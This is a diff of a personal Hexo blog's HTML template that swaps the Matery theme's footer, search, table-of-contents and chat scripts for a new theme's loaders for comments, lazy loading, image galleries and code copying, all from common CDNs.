4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
 </div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
 
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
 
+</script>
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
 
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
 
-
-<!-- 代码语言 -->
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('3'),
-            headingSelector: 'h2, h3, h4, h5, h6'
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
         });
+    }
 
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
     });
 </script>
 
-    
-
-</main>
 
 
-
-
-    <footer class="page-footer bg-color">
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2019-2024</span>
-            
-            <a href="/about" target="_blank">hybcx</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">861.1k</span>
-            
-            
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link ">
-    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
-        <i class="fab fa-facebook-f"></i>
-    </a>
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
-</footer>
-
-<div class="progress-bar"></div>
-
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
-
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
-    }
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-    
-    
-        
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
-            }
-        </script>
-    
-
-    <!-- 雪花特效 -->
-    
-
-    <!-- 鼠标星星特效 -->
-    
-
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
         }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `16px`,
+      duration: `800`,
+      interval: `100`,
+      scale: `1`,
+      opacity: 0,
+      easing: "ease-out"
+    };
+    ScrollReveal().reveal('.l_left .slide-up', slideUp);
+    ScrollReveal().reveal('.l_main .slide-up', slideUp);
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
 
-    
-        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
-        <script>
-            $(document).ready(function () {
-                setInterval(change_Tidio, 50);
-                function change_Tidio() {
-                    var tidio=$("#tidio-chat iframe");
-                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
-                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
-                    }
-                }
-            });
-        </script>
-    
 
-    
-
-    <!--腾讯兔小巢-->
-    
-    
-
-    
-
-    
-
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
-</html>
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYDark.js"></script>
+</div></body></html>
